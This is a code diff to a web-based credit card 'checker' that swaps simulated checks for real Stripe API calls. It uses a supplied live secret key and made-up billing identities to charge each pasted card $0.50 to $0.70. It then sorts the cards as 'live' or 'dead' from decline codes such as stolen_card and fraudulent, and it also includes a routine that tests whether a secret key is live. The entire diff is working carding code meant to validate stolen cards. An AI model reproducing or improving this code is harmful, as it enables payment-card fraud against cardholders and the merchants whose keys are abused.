@@ -700,8 +700,287 @@ function checkSingleCard(card) {
   return 'live';
 }
 
-// ── Main Check Function ──
+// ── Main Check Function (Real Stripe API — ported from Sahil gate.py) ──
+let isChecking = false;
+
+async function getRandomUserInfo() {
+  try {
+    const res = await fetch('https://randomuser.me/api/?nat=us');
+    const data = await res.json();
+    const r = data.results[0];
+    const stateMap = {
+      'Alabama':'AL','Alaska':'AK','Arizona':'AZ','Arkansas':'AR','California':'CA',
+      'Colorado':'CO','Connecticut':'CT','Delaware':'DE','Florida':'FL','Georgia':'GA',
+      'Hawaii':'HI','Idaho':'ID','Illinois':'IL','Indiana':'IN','Iowa':'IA','Kansas':'KS',
+      'Kentucky':'KY','Louisiana':'LA','Maine':'ME','Maryland':'MD','Massachusetts':'MA',
+      'Michigan':'MI','Minnesota':'MN','Mississippi':'MS','Missouri':'MO','Montana':'MT',
+      'Nebraska':'NE','Nevada':'NV','New Hampshire':'NH','New Jersey':'NJ','New Mexico':'NM',
+      'New York':'NY','North Carolina':'NC','North Dakota':'ND','Ohio':'OH','Oklahoma':'OK',
+      'Oregon':'OR','Pennsylvania':'PA','Rhode Island':'RI','South Carolina':'SC',
+      'South Dakota':'SD','Tennessee':'TN','Texas':'TX','Utah':'UT','Vermont':'VT',
+      'Virginia':'VA','Washington':'WA','West Virginia':'WV','Wisconsin':'WI','Wyoming':'WY'
+    };
+    return {
+      fname: r.name.first,
+      lname: r.name.last,
+      email: r.name.first + r.name.last + Math.floor(Math.random()*100000) + '@gmail.com',
+      phone: '' + (220+Math.floor(Math.random()*600)) + (100+Math.floor(Math.random()*900)) + (1000+Math.floor(Math.random()*9000)),
+      add1: r.location.street.number + ' ' + r.location.street.name,
+      city: r.location.city,
+      state_short: stateMap[r.location.state] || 'NY',
+      zip: String(r.location.postcode)
+    };
+  } catch(e) {
+    return {
+      fname:'Alex', lname:'Smith',
+      email:'alexsmith'+Math.floor(Math.random()*100000)+'@gmail.com',
+      phone:''+( 220+Math.floor(Math.random()*600))+(100+Math.floor(Math.random()*900))+(1000+Math.floor(Math.random()*9000)),
+      add1:'17 East 73rd Street', city:'New York', state_short:'NY', zip:'10021'
+    };
+  }
+}
+
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+    const r = Math.random()*16|0;
+    return (c === 'x' ? r : (r&0x3|0x8)).toString(16);
+  });
+}
+
+// ── Create Payment Method + Payment Intent (from gate.py) ──
+async function stripeCheckCard(fullcc, skKey) {
+  const [cc, mes, ano, cvv] = fullcc.split('|');
+  const info = await getRandomUserInfo();
+
+  // Step 1: Create Payment Method
+  const pmParams = new URLSearchParams({
+    'type': 'card',
+    'billing_details[name]': info.fname + ' ' + info.lname,
+    'billing_details[address][city]': info.city,
+    'billing_details[address][country]': 'US',
+    'billing_details[address][line1]': info.add1,
+    'billing_details[address][postal_code]': info.zip,
+    'billing_details[address][state]': info.state_short,
+    'card[number]': cc,
+    'card[cvc]': cvv,
+    'card[exp_month]': mes,
+    'card[exp_year]': ano,
+    'guid': uuidv4(),
+    'muid': uuidv4(),
+    'sid': uuidv4(),
+    'payment_user_agent': 'stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element',
+    'time_on_page': String(10021 + Math.floor(Math.random()*70)),
+  });
+
+  let pmRes;
+  try {
+    pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Authorization': 'Bearer ' + skKey,
+      },
+      body: pmParams.toString()
+    });
+  } catch(e) {
+    return { status: 'error', response: 'Network Error', hits: 'NO' };
+  }
+
+  const pmText = await pmRes.text();
+
+  // Check for SK errors on step 1
+  if (pmText.includes('Invalid API Key') || pmText.includes('testmode_charges_only') || pmText.includes('api_key_expired') || pmText.includes('Your account cannot currently make live charges')) {
+    return { status: 'error', response: 'SK Key Dead/Expired', hits: 'SK_DEAD' };
+  }
+  if (pmText.includes('rate_limit')) {
+    return { status: 'error', response: 'Rate Limited — Try Again', hits: 'NO' };
+  }
+
+  let pmId;
+  try {
+    const pmJson = JSON.parse(pmText);
+    pmId = pmJson.id;
+    if (!pmId) {
+      // Try to get error message
+      const errMsg = pmJson.error ? pmJson.error.message : 'Payment Method Failed';
+      return { status: 'Declined ❌', response: errMsg, hits: 'NO' };
+    }
+  } catch(e) {
+    return { status: 'error', response: 'Invalid Stripe Response', hits: 'NO' };
+  }
+
+  // Step 2: Create Payment Intent (Charge $0.50-$0.70)
+  const piParams = new URLSearchParams({
+    'amount': String(50 + Math.floor(Math.random()*21)),
+    'currency': 'usd',
+    'payment_method_types[]': 'card',
+    'payment_method': pmId,
+    'confirm': 'true',
+    'off_session': 'true',
+    'use_stripe_sdk': 'true',
+    'description': 'None',
+    'receipt_email': info.email,
+    'metadata[order_id]': String(Math.floor(Math.random()*999999999999999)),
+  });
+
+  let piRes;
+  try {
+    piRes = await fetch('https://api.stripe.com/v1/payment_intents', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Authorization': 'Bearer ' + skKey,
+      },
+      body: piParams.toString()
+    });
+  } catch(e) {
+    return { status: 'error', response: 'Network Error on Charge', hits: 'NO' };
+  }
+
+  const piText = await piRes.text();
+
+  // ── Parse Response (from response.py — 25+ response codes) ──
+  return parseStripeResponse(piText, fullcc);
+}
+
+// ── Response Parser (ported from Sahil response.py) ──
+function parseStripeResponse(text, fullcc) {
+  const t = text;
+
+  // LIVE — Charged
+  if (t.includes('succeeded') || t.includes('thank you') || t.includes('Thank you') ||
+      t.includes('success:true') || t.includes('Thank You')) {
+    return { status: 'Approved ✅', response: 'Charged! 🔥', hits: 'CHARGED' };
+  }
+
+  // LIVE — Insufficient Funds
+  if (t.includes('insufficient_funds') || t.includes('card has insufficient funds')) {
+    return { status: 'Approved ✅', response: 'Insufficient Funds', hits: 'LIVE' };
+  }
+
+  // LIVE — Incorrect CVC (card itself is live, just wrong CVV)
+  if (t.includes('incorrect_cvc') || t.includes('security code is incorrect')) {
+    return { status: 'Approved ✅', response: 'CCN Live (Wrong CVV)', hits: 'LIVE' };
+  }
+
+  // LIVE — Transaction Not Allowed
+  if (t.includes('transaction_not_allowed')) {
+    return { status: 'Approved ✅', response: 'Transaction Not Allowed', hits: 'LIVE' };
+  }
+
+  // LIVE — CVC Check Pass
+  if (t.includes('"cvc_check": "pass"') || t.includes('"cvc_check":"pass"')) {
+    return { status: 'Approved ✅', response: 'CVV Live', hits: 'LIVE' };
+  }
+
+  // LIVE — 3D Secure Required
+  if (t.includes('three_d_secure_redirect') || t.includes('card_error_authentication_required') || t.includes('stripe_3ds2_fingerprint')) {
+    return { status: 'Approved ✅', response: '3D Secure Required', hits: 'LIVE' };
+  }
+
+  // LIVE — Card doesn't support purchase
+  if (t.includes('Your card does not support this type of purchase') || t.includes('card does not support')) {
+    return { status: 'Approved ✅', response: 'Card Doesn\'t Support Purchase', hits: 'LIVE' };
+  }
+
+  // DEAD — Generic Decline
+  if (t.includes('generic_decline') || t.includes('card_decline_rate_limit_exceeded') ||
+      t.includes('exceeded the maximum number of declines')) {
+    return { status: 'Declined ❌', response: 'Generic Decline', hits: 'NO' };
+  }
+
+  // DEAD — Do Not Honor
+  if (t.includes('do_not_honor')) {
+    return { status: 'Declined ❌', response: 'Do Not Honor', hits: 'NO' };
+  }
+
+  // DEAD — Fraudulent
+  if (t.includes('fraudulent')) {
+    return { status: 'Declined ❌', response: 'Fraudulent', hits: 'NO' };
+  }
+
+  // DEAD — Stolen Card
+  if (t.includes('stolen_card')) {
+    return { status: 'Declined ❌', response: 'Stolen Card', hits: 'NO' };
+  }
+
+  // DEAD — Lost Card
+  if (t.includes('lost_card')) {
+    return { status: 'Declined ❌', response: 'Lost Card', hits: 'NO' };
+  }
+
+  // DEAD — Pickup Card
+  if (t.includes('pickup_card')) {
+    return { status: 'Declined ❌', response: 'Pickup Card', hits: 'NO' };
+  }
+
+  // DEAD — Incorrect Number
+  if (t.includes('incorrect_number') || t.includes('Your card number is incorrect')) {
+    return { status: 'Declined ❌', response: 'Incorrect Card Number', hits: 'NO' };
+  }
+
+  // DEAD — Expired Card
+  if (t.includes('expired_card') || t.includes('Your card has expired')) {
+    return { status: 'Declined ❌', response: 'Expired Card', hits: 'NO' };
+  }
+
+  // DEAD — Invalid CVC
+  if (t.includes('invalid_cvc')) {
+    return { status: 'Declined ❌', response: 'Invalid CVC', hits: 'NO' };
+  }
+
+  // DEAD — Invalid Account
+  if (t.includes('invalid_account')) {
+    return { status: 'Declined ❌', response: 'Dead Card', hits: 'NO' };
+  }
+
+  // DEAD — SK Error
+  if (t.includes('Invalid API Key') || t.includes('testmode_charges_only') || t.includes('api_key_expired') || t.includes('cannot currently make live charges')) {
+    return { status: 'Declined ❌', response: 'SK Key Error', hits: 'SK_DEAD' };
+  }
+
+  // DEAD — Card Declined generic
+  if (t.includes('Your card was declined') || t.includes('card was declined') || t.includes('card_declined')) {
+    return { status: 'Declined ❌', response: 'Card Declined', hits: 'NO' };
+  }
+
+  // DEAD — Intent confirmation challenge
+  if (t.includes('intent_confirmation_challenge') || t.includes('setup_intent_authentication_failure')) {
+    return { status: 'Declined ❌', response: 'Auth Challenge Failed', hits: 'NO' };
+  }
+
+  // DEAD — Expiry invalid
+  if (t.includes('expiration year is invalid') || t.includes('expiration month is invalid') || t.includes('invalid_expiry')) {
+    return { status: 'Declined ❌', response: 'Invalid Expiry', hits: 'NO' };
+  }
+
+  // DEAD — Card not supported
+  if (t.includes('card is not supported')) {
+    return { status: 'Declined ❌', response: 'Card Not Supported', hits: 'NO' };
+  }
+
+  // DEAD — Cross-border
+  if (t.includes('cross border')) {
+    return { status: 'Declined ❌', response: 'Cross Border Not Allowed', hits: 'NO' };
+  }
+
+  // Default — extract error message
+  try {
+    const json = JSON.parse(t);
+    if (json.error && json.error.message) {
+      return { status: 'Declined ❌', response: json.error.message, hits: 'NO' };
+    }
+  } catch(e) {}
+
+  return { status: 'Declined ❌', response: 'Unknown Decline', hits: 'NO' };
+}
+
 function checkCards() {
+  if (isChecking) {
+    showToast('Already checking, please wait...', 'info');
+    return;
+  }
+
   const input = document.getElementById('checkerInput').value.trim();
   if (!input) {
     showToast('Paste cards to check', 'error');
@@ -718,10 +997,12 @@ function checkCards() {
     showToast('Please verify your SK Key first', 'error');
     const skInput = document.getElementById('skKeyInput');
     skInput.focus();
-    skInput.parentElement.parentElement.style.animation = 'shake 0.4s ease'; // basic visual cue
+    skInput.parentElement.parentElement.style.animation = 'shake 0.4s ease';
     setTimeout(() => skInput.parentElement.parentElement.style.animation = '', 400);
     return;
   }
+
+  const skKey = document.getElementById('skKeyInput').value.trim();
 
   // Show UI elements
   const btn = document.getElementById('checkBtn');
@@ -735,6 +1016,7 @@ function checkCards() {
   btnLoader.classList.remove('hidden');
   btn.disabled = true;
   progress.classList.remove('hidden');
+  isChecking = true;
 
   let live = 0, dead = 0, unknown = 0;
   let deadCards = [], unknownCards = [];
@@ -745,80 +1027,103 @@ function checkCards() {
   // Reset checker results
   checkerResults = { live: [], dead: [], unknown: [] };
 
-  // Process cards one by one with animation
-  function processNext() {
+  // Reset progress
+  document.getElementById('progressFill').style.width = '0%';
+  document.getElementById('progressText').textContent = '0%';
+  stats.classList.add('hidden');
+  resultGroup.classList.add('hidden');
+
+  // Process cards sequentially via real Stripe API
+  async function processNext() {
     if (processed >= total) {
-      // Done — show results
+      // Done
       btnContent.classList.remove('hidden');
       btnLoader.classList.add('hidden');
       btn.disabled = false;
+      isChecking = false;
       stats.classList.remove('hidden');
 
       document.getElementById('liveCount').textContent = live;
       document.getElementById('deadCount').textContent = dead;
       document.getElementById('unknownCount').textContent = unknown;
 
-      // Store results for filter
       checkerResults.live = liveCards;
       checkerResults.dead = deadCards;
       checkerResults.unknown = unknownCards;
 
-      // Show live cards by default
       filterCheckerResult('live');
 
-      // Auto-update input to only live cards
       if (liveCards.length > 0) {
         document.getElementById('checkerInput').value = liveCards.join('\n');
       }
 
-      // Update checker tab count
       document.getElementById('chkTabCount').textContent = `${live}✓`;
-
-      // Success rate
       updateSuccessRate(live, total);
 
-      // Session tracking
       sessionStats.checked += total;
       sessionStats.live += live;
       updateSessionStats();
 
-      showToast(`Step 2/2 ✓ ${live} live, ${dead} dead, ${unknown} unknown`, live > 0 ? 'success' : 'error');
+      showToast(`Done! ${live} live, ${dead} dead, ${unknown} errors`, live > 0 ? 'success' : 'error');
       return;
     }
 
     const card = parseCardLine(lines[processed]);
-    const result = checkSingleCard(card);
-
-    if (result === 'live') {
-      live++;
-      liveCards.push(lines[processed].trim());
-    } else if (result === 'dead') {
-      dead++;
-      deadCards.push(lines[processed].trim());
-    } else {
+    if (!card) {
       unknown++;
       unknownCards.push(lines[processed].trim());
+      processed++;
+      updateProgress(processed, total);
+      processNext();
+      return;
+    }
+
+    // Real Stripe API check
+    const fullcc = `${card.cc}|${card.mm}|${card.yyyy}|${card.cvv}`;
+    try {
+      const result = await stripeCheckCard(fullcc, skKey);
+
+      if (result.hits === 'SK_DEAD') {
+        // SK is dead, stop checking
+        showToast('SK Key is Dead/Expired! Stopping.', 'error');
+        isSkVerified = false;
+        const verBtn = document.getElementById('verifySkBtn');
+        verBtn.textContent = 'Dead';
+        verBtn.className = 'verify-btn dead';
+        btnContent.classList.remove('hidden');
+        btnLoader.classList.add('hidden');
+        btn.disabled = false;
+        isChecking = false;
+        return;
+      }
+
+      if (result.hits === 'CHARGED' || result.hits === 'LIVE') {
+        live++;
+        liveCards.push(lines[processed].trim() + ' → ' + result.response);
+      } else {
+        dead++;
+        deadCards.push(lines[processed].trim() + ' → ' + result.response);
+      }
+    } catch(e) {
+      unknown++;
+      unknownCards.push(lines[processed].trim() + ' → Error');
     }
 
     processed++;
-    const pct = Math.round((processed / total) * 100);
-    document.getElementById('progressFill').style.width = pct + '%';
-    document.getElementById('progressText').textContent = pct + '%';
+    updateProgress(processed, total);
 
-    // Animate with small delay per card
-    const delay = total > 100 ? 10 : total > 30 ? 30 : 60;
-    setTimeout(processNext, delay);
+    // Small delay between cards to avoid rate limiting
+    setTimeout(processNext, 1500);
   }
 
-  // Reset
-  document.getElementById('progressFill').style.width = '0%';
-  document.getElementById('progressText').textContent = '0%';
-  stats.classList.add('hidden');
-  resultGroup.classList.add('hidden');
-
-  setTimeout(processNext, 200);
+  processNext();
 }
 
+function updateProgress(processed, total) {
+  const pct = Math.round((processed / total) * 100);
+  document.getElementById('progressFill').style.width = pct + '%';
+  document.getElementById('progressText').textContent = pct + '%';
+}
 
 
 // ── Copy Live Cards ──
@@ -866,7 +1171,7 @@ function downloadFilteredCards() {
   document.body.removeChild(a);
 }
 
-// ── SK Key Verification ──
+// ── SK Key Verification (Real Stripe API Test) ──
 let isSkVerified = false;
 
 function resetSkVerification() {
@@ -876,7 +1181,7 @@ function resetSkVerification() {
   btn.className = 'verify-btn';
 }
 
-function verifySkKey() {
+async function verifySkKey() {
   const input = document.getElementById('skKeyInput').value.trim();
   const btn = document.getElementById('verifySkBtn');
   
@@ -889,21 +1194,53 @@ function verifySkKey() {
     btn.textContent = 'Dead';
     btn.className = 'verify-btn dead';
     isSkVerified = false;
-    showToast('Invalid SK Key format', 'error');
+    showToast('Invalid SK Key format (must start with sk_live_)', 'error');
     return;
   }
   
-  // Mock Verification process
+  // Real Stripe API verification
   btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
   btn.disabled = true;
   
-  setTimeout(() => {
+  try {
+    const res = await fetch('https://api.stripe.com/v1/balance', {
+      method: 'GET',
+      headers: {
+        'Authorization': 'Bearer ' + input,
+      }
+    });
+    
+    const text = await res.text();
     btn.disabled = false;
-    isSkVerified = true;
-    btn.innerHTML = '<i class="fa-solid fa-check"></i> Verified';
-    btn.className = 'verify-btn verified';
-    showToast('SK Key Verified!', 'success');
-  }, 800);
+
+    if (res.ok) {
+      isSkVerified = true;
+      btn.innerHTML = '<i class="fa-solid fa-check"></i> Live';
+      btn.className = 'verify-btn verified';
+      showToast('SK Key is LIVE! ✅', 'success');
+    } else if (text.includes('Invalid API Key') || text.includes('api_key_expired')) {
+      isSkVerified = false;
+      btn.textContent = 'Dead';
+      btn.className = 'verify-btn dead';
+      showToast('SK Key is Dead/Expired ❌', 'error');
+    } else if (text.includes('testmode_charges_only') || text.includes('cannot currently make live charges')) {
+      isSkVerified = false;
+      btn.textContent = 'Dead';
+      btn.className = 'verify-btn dead';
+      showToast('SK Key cannot make live charges ❌', 'error');
+    } else {
+      isSkVerified = false;
+      btn.textContent = 'Dead';
+      btn.className = 'verify-btn dead';
+      showToast('SK Key verification failed ❌', 'error');
+    }
+  } catch(e) {
+    btn.disabled = false;
+    btn.textContent = 'Error';
+    btn.className = 'verify-btn dead';
+    isSkVerified = false;
+    showToast('Network error during verification', 'error');
+  }
 }
 
 // ── Clear Checker ──
